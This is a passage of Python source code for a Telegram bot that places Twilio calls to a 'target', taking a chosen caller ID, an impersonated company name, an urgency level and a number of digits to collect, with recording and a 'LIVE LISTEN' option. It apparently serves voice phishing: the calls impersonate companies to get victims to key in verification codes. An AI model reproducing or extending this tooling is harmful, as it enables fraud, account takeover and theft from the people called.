            if history_path.exists():
                try:
                    with open(history_path, 'r', encoding='utf-8') as f:
                        history = json.load(f)
                except Exception:
                    history = []
            history.append({
                "sid": sid,
                "target": phone,
                "started": datetime.now().isoformat(),
                "status": "initiated",
                "target_name": name,
                "company": company,
            })
            with open(history_path, 'w', encoding='utf-8') as f:
                json.dump(history, f, indent=2)

            live_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen")],
            ])
            await query.edit_message_text(
                f"📞 *Call Started*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 Call SID: `{sid}`\n"
                f"👤 Target: {name}\n"
                f"📞 Phone: `{phone}`\n"
                f"🎙️ Voice: {read_user_file(user_id, 'VoiceName.txt', 'Default')}\n\n"
                f"Recording is enabled for this call. A single professional verification script will play when the call connects.\n"
                f"You will receive a notification shortly.",
                reply_markup=live_keyboard,
                parse_mode="Markdown"
            )
        else:
            await query.edit_message_text("❌ Call failed to initiate. Check Twilio configuration.")
    except AllLinesBusyError:
        await query.edit_message_text("⚠️ <b>ALL LINES BUSY</b>\n\nAll numbers are currently active on other calls. Please try again in a moment.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Call initiation error: {e}", exc_info=True)
        await query.edit_message_text(f"❌ Error: {str(e)}")


# ======================================================================
# AMD CALLBACK (for async machine detection)
# ======================================================================

# ======================================================================
# SCHEDULING
# ======================================================================

async def normal_schedule_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    try:
        scheduled_time = datetime.strptime(text, "%d/%m/%Y %H:%M")
        if scheduled_time < datetime.now():
            await update.message.reply_text("❌ Scheduled time must be in the future.")
            return NORMAL_SCHEDULE
        write_user_file(user_id, "scheduled_time.txt", text)
        await update.message.reply_text(
            f"✅ Call scheduled for `{scheduled_time.strftime('%d/%m/%Y %H:%M')}`.\n"
            f"You will be notified when it starts.",
            parse_mode="Markdown"
        )
        clear_user_state(user_id)
        await send_main_menu(update, context)
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid format. Use:\n"
            "`DD/MM/YYYY HH:MM`\n"
            "Example: `25/12/2026 14:30`",
            parse_mode="Markdown"
        )
        return NORMAL_SCHEDULE


# ======================================================================
# CANCEL
# ======================================================================

async def cancel_normal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    clear_user_state(user_id)
    await update.message.reply_text("❌ Cancelled. Use /start to return.")
    await send_main_menu(update, context)
    return ConversationHandler.END


# ======================================================================
# CONVERSATION HANDLER
# ======================================================================

def get_normal_call_conversation_handler():
    """Return the ConversationHandler for Normal Calling."""
    from telegram.ext import ConversationHandler, CommandHandler, MessageHandler, filters, CallbackQueryHandler

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("normal", normal_start)],
        states={
            NORMAL_SCENARIO: [
                CallbackQueryHandler(normal_scenario, pattern="^normal_scenario_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, normal_scenario),
            ],
            NORMAL_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_phone)],
            NORMAL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_name)],
            NORMAL_URGENCY: [
                CallbackQueryHandler(normal_urgency, pattern="^normal_urgency_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, normal_urgency),
            ],
            NORMAL_CALLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_caller_id)],
            NORMAL_FROM_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_from_name)],
            NORMAL_COMPANY: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_company)],
            NORMAL_LANGUAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_language)],
            NORMAL_DELIVERY: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_delivery)],
            NORMAL_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_digits)],
            NORMAL_VOICE: [CallbackQueryHandler(normal_voice_callback, pattern="^voice_select_|^normal_|^cancel_call")],
            NORMAL_SCHEDULE: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_schedule_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_normal)],
        allow_reentry=True,
    )
    return conv_handler
